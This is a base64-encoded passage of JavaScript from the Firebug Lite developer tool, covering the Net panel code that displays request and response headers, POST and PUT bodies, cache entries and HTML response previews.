Sgic2VsZWN0ZWQiLCAidHJ1ZSIpOw0KICAgICAgICBzZXRDbGFzcyhuZXRJbmZvQm94LnNlbGVjdGVkVGV4dCwgIm5ldEluZm9UZXh0U2VsZWN0ZWQiKTsNCiAgICAgICAgDQogICAgICAgIHNldENsYXNzKHNlbGVjdGVkVGFiLCAibmV0SW5mb1RhYlNlbGVjdGVkIik7DQogICAgICAgIHNlbGVjdGVkVGFiLnNldEF0dHJpYnV0ZSgic2VsZWN0ZWQiLCAidHJ1ZSIpOw0KICAgICAgICBzZWxlY3RlZFRhYi5zZXRBdHRyaWJ1dGUoImFyaWEtc2VsZWN0ZWQiLCAidHJ1ZSIpOw0KDQogICAgICAgIHZhciBmaWxlID0gRmlyZWJ1Zy5nZXRSZXBPYmplY3QobmV0SW5mb0JveCk7DQogICAgICAgIA0KICAgICAgICAvL3ZhciBjb250ZXh0ID0gRmlyZWJ1Zy5nZXRFbGVtZW50UGFuZWwobmV0SW5mb0JveCkuY29udGV4dDsNCiAgICAgICAgdmFyIGNvbnRleHQgPSBGaXJlYnVnLmNocm9tZTsNCiAgICAgICAgDQogICAgICAgIHRoaXMudXBkYXRlSW5mbyhuZXRJbmZvQm94LCBmaWxlLCBjb250ZXh0KTsNCiAgICB9LA0KDQogICAgdXBkYXRlSW5mbzogZnVuY3Rpb24obmV0SW5mb0JveCwgZmlsZSwgY29udGV4dCkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19ORVQpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgibmV0LnVwZGF0ZUluZm87IGZpbGUiLCBmaWxlKTsNCg0KICAgICAgICBpZiAoIW5ldEluZm9Cb3gpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19ORVQgfHwgRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJuZXQudXBkYXRlSW5mbzsgRVJST1IgbmV0SW5mbyA9PSBudWxsICIgKyBmaWxlLmhyZWYsIGZpbGUpOw0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQoNCiAgICAgICAgdmFyIHRhYiA9IG5ldEluZm9Cb3guc2VsZWN0ZWRUYWI7DQogICAgICAgIA0KICAgICAgICBpZiAoaGFzQ2xhc3ModGFiLCAibmV0SW5mb1BhcmFtc1RhYiIpKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoZmlsZS51cmxQYXJhbXMgJiYgIW5ldEluZm9Cb3gudXJsUGFyYW1zUHJlc2VudGVkKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIG5ldEluZm9Cb3gudXJsUGFyYW1zUHJlc2VudGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB0aGlzLmluc2VydEhlYWRlclJvd3MobmV0SW5mb0JveCwgZmlsZS51cmxQYXJhbXMsICJQYXJhbXMiKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIGVsc2UgaWYgKGhhc0NsYXNzKHRhYiwgIm5ldEluZm9IZWFkZXJzVGFiIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBoZWFkZXJzVGV4dCA9ICQkKCIubmV0SW5mb0hlYWRlcnNUZXh0IiwgbmV0SW5mb0JveClbMF07DQogICAgICAgICAgICAvL3ZhciBoZWFkZXJzVGV4dCA9IG5ldEluZm9Cb3guZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgibmV0SW5mb0hlYWRlcnNUZXh0IikuaXRlbSgwKTsNCg0KICAgICAgICAgICAgaWYgKGZpbGUucmVzcG9uc2VIZWFkZXJzICYmICFuZXRJbmZvQm94LnJlc3BvbnNlSGVhZGVyc1ByZXNlbnRlZCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBuZXRJbmZvQm94LnJlc3BvbnNlSGVhZGVyc1ByZXNlbnRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgTmV0SW5mb0hlYWRlcnMucmVuZGVySGVhZGVycyhoZWFkZXJzVGV4dCwgZmlsZS5yZXNwb25zZUhlYWRlcnMsICJSZXNwb25zZUhlYWRlcnMiKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaWYgKGZpbGUucmVxdWVzdEhlYWRlcnMgJiYgIW5ldEluZm9Cb3gucmVxdWVzdEhlYWRlcnNQcmVzZW50ZWQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgbmV0SW5mb0JveC5yZXF1ZXN0SGVhZGVyc1ByZXNlbnRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgTmV0SW5mb0hlYWRlcnMucmVuZGVySGVhZGVycyhoZWFkZXJzVGV4dCwgZmlsZS5yZXF1ZXN0SGVhZGVycywgIlJlcXVlc3RIZWFkZXJzIik7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBlbHNlIGlmIChoYXNDbGFzcyh0YWIsICJuZXRJbmZvUG9zdFRhYiIpKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoIW5ldEluZm9Cb3gucG9zdFByZXNlbnRlZCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBuZXRJbmZvQm94LnBvc3RQcmVzZW50ZWQgID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAvL3ZhciBwb3N0VGV4dCA9IG5ldEluZm9Cb3guZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgibmV0SW5mb1Bvc3RUZXh0IikuaXRlbSgwKTsNCiAgICAgICAgICAgICAgICB2YXIgcG9zdFRleHQgPSAkJCgiLm5ldEluZm9Qb3N0VGV4dCIsIG5ldEluZm9Cb3gpWzBdOw0KICAgICAgICAgICAgICAgIE5ldEluZm9Qb3N0RGF0YS5yZW5kZXIoY29udGV4dCwgcG9zdFRleHQsIGZpbGUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgZWxzZSBpZiAoaGFzQ2xhc3ModGFiLCAibmV0SW5mb1B1dFRhYiIpKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoIW5ldEluZm9Cb3gucHV0UHJlc2VudGVkKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIG5ldEluZm9Cb3gucHV0UHJlc2VudGVkICA9IHRydWU7DQogICAgICAgICAgICAgICAgLy92YXIgcHV0VGV4dCA9IG5ldEluZm9Cb3guZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgibmV0SW5mb1B1dFRleHQiKS5pdGVtKDApOw0KICAgICAgICAgICAgICAgIHZhciBwdXRUZXh0ID0gJCQoIi5uZXRJbmZvUHV0VGV4dCIsIG5ldEluZm9Cb3gpWzBdOw0KICAgICAgICAgICAgICAgIE5ldEluZm9Qb3N0RGF0YS5yZW5kZXIoY29udGV4dCwgcHV0VGV4dCwgZmlsZSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBlbHNlIGlmIChoYXNDbGFzcyh0YWIsICJuZXRJbmZvUmVzcG9uc2VUYWIiKSAmJiBmaWxlLmxvYWRlZCAmJiAhbmV0SW5mb0JveC5yZXNwb25zZVByZXNlbnRlZCkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8vdmFyIHJlc3BvbnNlVGV4dEJveCA9IG5ldEluZm9Cb3guZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgibmV0SW5mb1Jlc3BvbnNlVGV4dCIpLml0ZW0oMCk7DQogICAgICAgICAgICB2YXIgcmVzcG9uc2VUZXh0Qm94ID0gJCQoIi5uZXRJbmZvUmVzcG9uc2VUZXh0IiwgbmV0SW5mb0JveClbMF07DQogICAgICAgICAgICBpZiAoZmlsZS5jYXRlZ29yeSA9PSAiaW1hZ2UiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIG5ldEluZm9Cb3gucmVzcG9uc2VQcmVzZW50ZWQgPSB0cnVlOw0KDQogICAgICAgICAgICAgICAgdmFyIHJlc3BvbnNlSW1hZ2UgPSBuZXRJbmZvQm94Lm93bmVyRG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7DQogICAgICAgICAgICAgICAgcmVzcG9uc2VJbWFnZS5zcmMgPSBmaWxlLmhyZWY7DQoNCiAgICAgICAgICAgICAgICBjbGVhck5vZGUocmVzcG9uc2VUZXh0Qm94KTsNCiAgICAgICAgICAgICAgICByZXNwb25zZVRleHRCb3guYXBwZW5kQ2hpbGQocmVzcG9uc2VJbWFnZSwgcmVzcG9uc2VUZXh0Qm94KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgLy8vaWYgKCEoYmluYXJ5Q2F0ZWdvcnlNYXAuaGFzT3duUHJvcGVydHkoZmlsZS5jYXRlZ29yeSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRoaXMuc2V0UmVzcG9uc2VUZXh0KGZpbGUsIG5ldEluZm9Cb3gsIHJlc3BvbnNlVGV4dEJveCwgY29udGV4dCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBlbHNlIGlmIChoYXNDbGFzcyh0YWIsICJuZXRJbmZvQ2FjaGVUYWIiKSAmJiBmaWxlLmxvYWRlZCAmJiAhbmV0SW5mb0JveC5jYWNoZVByZXNlbnRlZCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHJlc3BvbnNlVGV4dEJveCA9IG5ldEluZm9Cb3guZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgibmV0SW5mb0NhY2hlVGV4dCIpLml0ZW0oMCk7DQogICAgICAgICAgICBpZiAoZmlsZS5jYWNoZUVudHJ5KSB7DQogICAgICAgICAgICAgICAgbmV0SW5mb0JveC5jYWNoZVByZXNlbnRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgdGhpcy5pbnNlcnRIZWFkZXJSb3dzKG5ldEluZm9Cb3gsIGZpbGUuY2FjaGVFbnRyeSwgIkNhY2hlIik7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBlbHNlIGlmIChoYXNDbGFzcyh0YWIsICJuZXRJbmZvSHRtbFRhYiIpICYmIGZpbGUubG9hZGVkICYmICFuZXRJbmZvQm94Lmh0bWxQcmVzZW50ZWQpDQogICAgICAgIHsNCiAgICAgICAgICAgIG5ldEluZm9Cb3guaHRtbFByZXNlbnRlZCA9IHRydWU7DQoNCiAgICAgICAgICAgIHZhciB0ZXh0ID0gVXRpbHMuZ2V0UmVzcG9uc2VUZXh0KGZpbGUsIGNvbnRleHQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLy92YXIgaWZyYW1lID0gbmV0SW5mb0JveC5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJuZXRJbmZvSHRtbFByZXZpZXciKS5pdGVtKDApOw0KICAgICAgICAgICAgdmFyIGlmcmFtZSA9ICQkKCIubmV0SW5mb0h0bWxQcmV2aWV3IiwgbmV0SW5mb0JveClbMF07DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vL2lmcmFtZS5jb250ZW50V2luZG93LmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gdGV4dDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gbmV0IC0gcmVtb3ZlIHNjcmlwdHMNCiAgICAgICAgICAgIHZhciByZVNjcmlwdCA9IC88c2NyaXB0KC58XHMpKj9cL3NjcmlwdD4vZ2k7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHRleHQgPSB0ZXh0LnJlcGxhY2UocmVTY3JpcHQsICIiKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGlmcmFtZS5jb250ZW50V2luZG93LmRvY3VtZW50LndyaXRlKHRleHQpOw0KICAgICAgICAgICAgaWZyYW1lLmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQuY2xvc2UoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIE5vdGlmeSBsaXN0ZW5lcnMgYWJvdXQgdXBkYXRlIHNvLCBjb250ZW50IG9mIGN1c3RvbSB0YWJzIGNhbiBiZSB1cGRhdGVkLg0KICAgICAgICBkaXNwYXRjaChOZXRJbmZvQm9keS5mYkxpc3RlbmVycywgInVwZGF0ZVRhYkJvZHkiLCBbbmV0SW5mb0JveCwgZmlsZSwgY29udGV4dF0pOw0KICAgIH0sDQoNCiAgICBzZXRSZXNwb25zZVRleHQ6IGZ1bmN0aW9uKGZpbGUsIG5ldEluZm9Cb3gsIHJlc3BvbnNlVGV4dEJveCwgY29udGV4dCkNCiAgICB7DQogICAgICAgIC8vKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KICAgICAgICAvLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCiAgICAgICAgLy8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQogICAgICAgIG5ldEluZm9Cb3gucmVzcG9uc2VQcmVzZW50ZWQgPSB0cnVlOw0KICAgICAgICAvLyBsaW5lIGJyZWFrcyBzb21laG93IGFyZSBkaWZmZXJlbnQgaW4gSUUNCiAgICAgICAgLy8gbWFrZSB0aGlzIG9ubHkgb25jZSBpbiB0aGUgaW5pdGlhbGl6YXRpb24/IHdlIGRvbid0IGhhdmUgbmV0IHBhbmVscyBhbmQgbW9kdWxlcyB5ZXQuDQogICAgICAgIGlmIChpc0lFKQ0KICAgICAgICAgICAgcmVzcG9uc2VUZXh0Qm94LnN0eWxlLndoaXRlU3BhY2UgPSAibm93cmFwIjsNCiAgICAgICAgDQogICAgICAgIHJlc3BvbnNlVGV4dEJveFsNCiAgICAgICAgICAgICAgICB0eXBlb2YgcmVzcG9uc2VUZXh0Qm94LnRleHRDb250ZW50ICE9ICJ1bmRlZmluZWQiID8gDQogICAgICAgICAgICAgICAgICAgICAgICAidGV4dENvbnRlbnQiIDogDQogICAgICAgICAgICAgICAgICAgICAgICAiaW5uZXJUZXh0Ig0KICAgICAgICAgICAgXSA9IGZpbGUucmVzcG9uc2VUZXh0Ow0KICAgICAgICANCiAgICAgICAgcmV0dXJuOw0KICAgICAgICAvLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCiAgICAgICAgLy8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQogICAgICAgIC8vKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KICAgICAgICANCiAgICAgICAgLy8gR2V0IHJlc3BvbnNlIHRleHQgYW5kIG1ha2Ugc3VyZSBpdCBkb2Vzbid0IGV4Y2VlZCB0aGUgbWF4IGxpbWl0Lg0KICAgICAgICB2YXIgdGV4dCA9IFV0aWxzLmdldFJlc3BvbnNlVGV4dChmaWxlLCBjb250ZXh0KTsNCiAgICAgICAgdmFyIGxpbWl0ID0gRmlyZWJ1Zy5uZXREaXNwbGF5ZWRSZXNwb25zZUxpbWl0ICsgMTU7DQogICAgICAgIHZhciBsaW1pdFJlYWNoZWQgPSB0ZXh0ID8gKHRleHQubGVuZ3RoID4gbGltaXQpIDogZmFsc2U7DQogICAgICAgIGlmIChsaW1pdFJlYWNoZWQpDQogICAgICAgICAgICB0ZXh0ID0gdGV4dC5zdWJzdHIoMCwgbGltaXQpICsgIi4uLiI7DQoNCiAgICAgICAgLy8gSW5zZXJ0IHRoZSByZXNwb25zZSBpbnRvIHRoZSBVSS4NCiAgICAgICAgaWYgKHRleHQpDQogICAgICAgICAgICBpbnNlcnRXcmFwcGVkVGV4dCh0ZXh0LCByZXNwb25zZVRleHRCb3gpOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICBpbnNlcnRXcmFwcGVkVGV4dCgiIiwgcmVzcG9uc2VUZXh0Qm94KTsNCg0KICAgICAgICAvLyBBcHBlbmQgYSBtZXNzYWdlIGluZm9ybWluZyB0aGUgdXNlciB0aGF0IHRoZSByZXNwb25zZSBpc24ndCBmdWxseSBkaXNwbGF5ZWQuDQogICAgICAgIGlmIChsaW1pdFJlYWNoZWQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBvYmplY3QgPSB7DQogICAgICAgICAgICAgICAgdGV4dDogJFNUUigibmV0LnJlc3BvbnNlU2l6ZUxpbWl0TWVzc2FnZSIpLA0KICAgICAgICAgICAgICAgIG9uQ2xpY2tMaW5rOiBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHBhbmVsID0gY29udGV4dC5nZXRQYW5lbCgibmV0IiwgdHJ1ZSk7DQogICAgICAgICAgICAgICAgICAgIHBhbmVsLm9wZW5SZXNwb25zZUluVGFiKGZpbGUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH07DQogICAgICAgICAgICBGaXJlYnVnLk5ldE1vbml0b3IuUmVzcG9uc2VTaXplTGltaXQuYXBwZW5kKG9iamVjdCwgcmVzcG9uc2VUZXh0Qm94KTsNCiAgICAgICAgfQ0KDQogICAgICAgIG5ldEluZm9Cb3gucmVzcG9uc2VQcmVzZW50ZWQgPSB0cnVlOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19ORVQpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgibmV0LnNldFJlc3BvbnNlVGV4dDsgcmVzcG9uc2UgdGV4dCB1cGRhdGVkIik7DQogICAgfSwNCg0KICAgIGluc2VydEhlYWRlclJvd3M6IGZ1bmN0aW9uKG5ldEluZm9Cb3gsIGhlYWRlcnMsIHRhYmxlTmFtZSwgcm93TmFtZSkNCiAgICB7DQogICAgICAgIGlmICghaGVhZGVycy5sZW5ndGgpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgdmFyIGhlYWRlcnNUYWJsZSA9ICQkKCIubmV0SW5mbyIrdGFibGVOYW1lKyJUYWJsZSIsIG5ldEluZm9Cb3gpWzBdOw0KICAgICAgICAvL3ZhciBoZWFkZXJzVGFibGUgPSBuZXRJbmZvQm94LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoIm5ldEluZm8iK3RhYmxlTmFtZSsiVGFibGUiKS5pdGVtKDApOw0KICAgICAgICB2YXIgdGJvZHkgPSBnZXRDaGlsZEJ5Q2xhc3MoaGVhZGVyc1RhYmxlLCAibmV0SW5mbyIgKyByb3dOYW1lICsgIkJvZHkiKTsNCiAgICAgICAgaWYgKCF0Ym9keSkNCiAgICAgICAgICAgIHRib2R5ID0gaGVhZGVyc1RhYmxlLmZpcnN0Q2hpbGQ7DQogICAgICAgIHZhciB0aXRsZVJvdyA9IGdldENoaWxkQnlDbGFzcyh0Ym9keSwgIm5ldEluZm8iICsgcm93TmFtZSArICJUaXRsZSIpOw0KDQogICAgICAgIHRoaXMuaGVhZGVyRGF0YVRhZy5pbnNlcnRSb3dzKHtoZWFkZXJzOiBoZWFkZXJzfSwgdGl0bGVSb3cgPyB0aXRsZVJvdyA6IHRib2R5KTsNCiAgICAgICAgcmVtb3ZlQ2xhc3ModGl0bGVSb3csICJjb2xsYXBzZWQiKTsNCiAgICB9DQp9KTsNCg0KdmFyIE5ldEluZm9Cb2R5ID0gRmlyZWJ1Zy5OZXRNb25pdG9yLk5ldEluZm9Cb2R5Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLyoqDQogKiBAZG9tcGxhdGUgVXNlZCB3aXRoaW4gdGhlIE5ldCBwYW5lbCB0byBkaXNwbGF5IHJhdyBzb3VyY2Ugb2YgcmVxdWVzdCBhbmQgcmVzcG9uc2UgaGVhZGVycw0KICogYXMgd2VsbCBhcyBwcmV0dHktZm9ybWF0dGVkIHN1bW1hcnkgb2YgdGhlc2UgaGVhZGVycy4NCiAqLw0KRmlyZWJ1Zy5OZXRNb25pdG9yLk5ldEluZm9IZWFkZXJzID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsIC8vbmV3IEZpcmVidWcuTGlzdGVuZXIoKSwNCnsNCiAgICB0YWc6DQogICAgICAgIERJVih7ImNsYXNzIjogIm5ldEluZm9IZWFkZXJzVGFibGUiLCAicm9sZSI6ICJ0YWJwYW5lbCJ9LA0KICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAibmV0SW5mb0hlYWRlcnNHcm91cCBuZXRJbmZvUmVzcG9uc2VIZWFkZXJzVGl0bGUifSwNCiAgICAgICAgICAgICAgICBTUEFOKCRTVFIoIlJlc3BvbnNlSGVhZGVycyIpKSwNCiAgICAgICAgICAgICAgICBTUEFOKHsiY2xhc3MiOiAibmV0SGVhZGVyc1ZpZXdTb3VyY2UgcmVzcG9uc2UgY29sbGFwc2VkIiwgb25jbGljazogIiRvblZpZXdTb3VyY2UiLA0KICAgICAgICAgICAgICAgICAgICBfc291cmNlRGlzcGxheWVkOiBmYWxzZSwgX3Jvd05hbWU6ICJSZXNwb25zZUhlYWRlcnMifSwNCiAgICAgICAgICAgICAgICAgICAgJFNUUigibmV0LmhlYWRlcnMudmlldyBzb3VyY2UiKQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBUQUJMRSh7Y2VsbHBhZGRpbmc6IDAsIGNlbGxzcGFjaW5nOiAwfSwNCiAgICAgICAgICAgICAgICBUQk9EWSh7ImNsYXNzIjogIm5ldEluZm9SZXNwb25zZUhlYWRlcnNCb2R5IiwgInJvbGUiOiAibGlzdCIsDQogICAgICAgICAgICAgICAgICAgICJhcmlhLWxhYmVsIjogJFNUUigiUmVzcG9uc2VIZWFkZXJzIil9KQ0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogIm5ldEluZm9IZWFkZXJzR3JvdXAgbmV0SW5mb1JlcXVlc3RIZWFkZXJzVGl0bGUifSwNCiAgICAgICAgICAgICAgICBTUEFOKCRTVFIoIlJlcXVlc3RIZWFkZXJzIikpLA0KICAgICAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJuZXRIZWFkZXJzVmlld1NvdXJjZSByZXF1ZXN0IGNvbGxhcHNlZCIsIG9uY2xpY2s6ICIkb25WaWV3U291cmNlIiwNCiAgICAgICAgICAgICAgICAgICAgX3NvdXJjZURpc3BsYXllZDogZmFsc2UsIF9yb3dOYW1lOiAiUmVxdWVzdEhlYWRlcnMifSwNCiAgICAgICAgICAgICAgICAgICAgJFNUUigibmV0LmhlYWRlcnMudmlldyBzb3VyY2UiKQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBUQUJMRSh7Y2VsbHBhZGRpbmc6IDAsIGNlbGxzcGFjaW5nOiAwfSwNCiAgICAgICAgICAgICAgICBUQk9EWSh7ImNsYXNzIjogIm5ldEluZm9SZXF1ZXN0SGVhZGVyc0JvZHkiLCAicm9sZSI6ICJsaXN0IiwNCiAgICAgICAgICAgICAgICAgICAgImFyaWEtbGFiZWwiOiAkU1RSKCJSZXF1ZXN0SGVhZGVycyIpfSkNCiAgICAgICAgICAgICkNCiAgICAgICAgKSwNCg0KICAgIHNvdXJjZVRhZzoNCiAgICAgICAgVFIoeyJyb2xlIjogInByZXNlbnRhdGlvbiJ9LA0KICAgICAgICAgICAgVEQoe2NvbHNwYW46IDIsICJyb2xlIjogInByZXNlbnRhdGlvbiJ9LA0KICAgICAgICAgICAgICAgIFBSRSh7ImNsYXNzIjogInNvdXJjZSJ9KQ0KICAgICAgICAgICAgKQ0KICAgICAgICApLA0KDQogICAgb25WaWV3U291cmNlOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIHZhciB0YXJnZXQgPSBldmVudC50YXJnZXQ7DQogICAgICAgIHZhciByZXF1ZXN0SGVhZGVycyA9ICh0YXJnZXQucm93TmFtZSA9PSAiUmVxdWVzdEhlYWRlcnMiKTsNCg0KICAgICAgICB2YXIgbmV0SW5mb0JveCA9IGdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJuZXRJbmZvQm9keSIpOw0KICAgICAgICB2YXIgZmlsZSA9IG5ldEluZm9Cb3gucmVwT2JqZWN0Ow0KDQogICAgICAgIGlmICh0YXJnZXQuc291cmNlRGlzcGxheWVkKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaGVhZGVycyA9IHJlcXVlc3RIZWFkZXJzID8gZmlsZS5yZXF1ZXN0SGVhZGVycyA6IGZpbGUucmVzcG9uc2VIZWFkZXJzOw0KICAgICAgICAgICAgdGhpcy5pbnNlcnRIZWFkZXJSb3dzKG5ldEluZm9Cb3gsIGhlYWRlcnMsIHRhcmdldC5yb3dOYW1lKTsNCiAgICAgICAgICAgIHRhcmdldC5pbm5lckhUTUwgPSAkU1RSKCJuZXQuaGVhZGVycy52aWV3IHNvdXJjZSIpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHNvdXJjZSA9IHJlcXVlc3RIZWFkZXJzID8gZmlsZS5yZXF1ZXN0SGVhZGVyc1RleHQgOiBmaWxlLnJlc3BvbnNlSGVhZGVyc1RleHQ7DQogICAgICAgICAgICB0aGlzLmluc2VydFNvdXJjZShuZXRJbmZvQm94LCBzb3VyY2UsIHRhcmdldC5yb3dOYW1lKTsNCiAgICAgICAgICAgIHRhcmdldC5pbm5lckhUTUwgPSAkU1RSKCJuZXQuaGVhZGVycy5wcmV0dHkgcHJpbnQiKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHRhcmdldC5zb3VyY2VEaXNwbGF5ZWQgPSAhdGFyZ2V0LnNvdXJjZURpc3BsYXllZDsNCg0KICAgICAgICBjYW5jZWxFdmVudChldmVudCk7DQogICAgfSwNCg0KICAgIGluc2VydFNvdXJjZTogZnVuY3Rpb24obmV0SW5mb0JveCwgc291cmNlLCByb3dOYW1lKQ0KICAgIHsNCiAgICAgICAgLy8gVGhpcyBicmVha3MgY29weSB0byBjbGlwYm9hcmQuDQogICAgICAgIC8vaWYgKHNvdXJjZSkNCiAgICAgICAgLy8gICAgc291cmNlID0gc291cmNlLnJlcGxhY2UoL1xyXG4vZ20sICI8c3BhbiBzdHlsZT0nY29sb3I6bGlnaHRncmF5Jz5cXHJcXG48L3NwYW4+XHJcbiIpOw0KDQogICAgICAgIC8vL3ZhciB0Ym9keSA9IG5ldEluZm9Cb3guZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgibmV0SW5mbyIgKyByb3dOYW1lICsgIkJvZHkiKS5pdGVtKDApOw0KICAgICAgICB2YXIgdGJvZHkgPSAkJCgiLm5ldEluZm8iICsgcm93TmFtZSArICJCb2R5IiwgbmV0SW5mb0JveClbMF07DQogICAgICAgIHZhciBub2RlID0gdGhpcy5zb3VyY2VUYWcucmVwbGFjZSh7fSwgdGJvZHkpOw0KICAgICAgICAvLy92YXIgc291cmNlTm9kZSA9IG5vZGUuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgic291cmNlIikuaXRlbSgwKTsNCiAgICAgICAgdmFyIHNvdXJjZU5vZGUgPSAkJCgiLnNvdXJjZSIsIG5vZGUpWzBdOw0KICAgICAgICBzb3VyY2VOb2RlLmlubmVySFRNTCA9IHNvdXJjZTsNCiAgICB9LA0KDQogICAgaW5zZXJ0SGVhZGVyUm93czogZnVuY3Rpb24obmV0SW5mb0JveCwgaGVhZGVycywgcm93TmFtZSkNCiAgICB7DQogICAgICAgIHZhciBoZWFkZXJzVGFibGUgPSAkJCgiLm5ldEluZm9IZWFkZXJzVGFibGUiLCBuZXRJbmZvQm94KVswXTsNCiAgICAgICAgdmFyIHRib2R5ID0gJCQoIi5uZXRJbmZvIiArIHJvd05hbWUgKyAiQm9keSIsIGhlYWRlcnNUYWJsZSlbMF07DQogICAgICAgIA0KICAgICAgICAvL3ZhciBoZWFkZXJzVGFibGUgPSBuZXRJbmZvQm94LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoIm5ldEluZm9IZWFkZXJzVGFibGUiKS5pdGVtKDApOw0KICAgICAgICAvL3ZhciB0Ym9keSA9IGhlYWRlcnNUYWJsZS5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJuZXRJbmZvIiArIHJvd05hbWUgKyAiQm9keSIpLml0ZW0oMCk7DQoNCiAgICAgICAgY2xlYXJOb2RlKHRib2R5KTsNCg0KICAgICAgICBpZiAoIWhlYWRlcnMubGVuZ3RoKQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIE5ldEluZm9Cb2R5LmhlYWRlckRhdGFUYWcuaW5zZXJ0Um93cyh7aGVhZGVyczogaGVhZGVyc30sIHRib2R5KTsNCg0KICAgICAgICB2YXIgdGl0bGVSb3cgPSBnZXRDaGlsZEJ5Q2xhc3MoaGVhZGVyc1RhYmxlLCAibmV0SW5mbyIgKyByb3dOYW1lICsgIlRpdGxlIik7DQogICAgICAgIHJlbW92ZUNsYXNzKHRpdGxlUm93LCAiY29sbGFwc2VkIik7DQogICAgfSwNCg0KICAgIGluaXQ6IGZ1bmN0aW9uKHBhcmVudCkNCiAgICB7DQogICAgICAgIHZhciByb290Tm9kZSA9IHRoaXMudGFnLmFwcGVuZCh7fSwgcGFyZW50KTsNCg0KICAgICAgICB2YXIgbmV0SW5mb0JveCA9IGdldEFuY2VzdG9yQnlDbGFzcyhwYXJlbnQsICJuZXRJbmZvQm9keSIpOw0KICAgICAgICB2YXIgZmlsZSA9IG5ldEluZm9Cb3gucmVwT2JqZWN0Ow0KDQogICAgICAgIHZhciB2aWV3U291